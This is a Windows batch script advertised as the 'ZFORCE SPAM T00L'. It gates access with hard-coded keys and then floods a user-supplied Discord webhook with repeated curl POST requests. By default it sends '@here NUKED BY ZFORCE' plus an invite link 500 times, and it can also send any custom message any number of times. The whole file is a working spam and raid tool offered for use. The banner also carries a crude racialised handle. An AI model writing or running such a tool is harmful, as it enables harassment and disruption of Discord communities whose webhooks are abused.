@echo off
:: Set colors
color 0C

:: Title
echo ===========================================
echo @ZFORCE  PRODUCTION   DEV  SLYG3N
echo ZFORCE SPAM T00L      DEV iluvblackgirls
echo ===========================================
echo.

:: Define valid keys
set keys=A3B2K Z9R8F P5W7Q T1X4G J6H2L C8N3R Q0S5M F4E1D H7T9B V2Y6X

:auth
set /p userKey=Enter your authentication key: 

:: Check if the key is valid
set validKey=false
for %%k in (%keys%) do (
    if "%%k"=="%userKey%" set validKey=true
)

if "%validKey%"=="false" (
    echo Invalid key! Please try again.
    goto auth
)

:menu
echo 1. TEST MESSAGE 
echo 2. Custom message option
echo 3. Open Discord support page
echo 4. Exit
set /p choice=Select an option (1-4): 

if "%choice%"=="1" goto sendDefault
if "%choice%"=="2" goto customMessage
if "%choice%"=="3" start https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks
if "%choice%"=="4" exit
goto menu

:sendDefault
set /p webhook=Webhook: 
set count=1

:send
if %count% GTR 500 goto endSend
cls 
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@here NUKED BY ZFORCE https://discord.gg/6NEyPbPB\"}" %webhook%
set /a count+=1
goto send

:endSend
pause
goto menu

:customMessage
set /p webhook=Webhook: 
set /p message=Enter your custom message: 
set /p amount=Enter number of times to send: 
set count=1

:sendCustom
if %count% GTR %amount% goto endCustom
cls 
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%
set /a count+=1
goto sendCustom

:endCustom
pause
goto menu
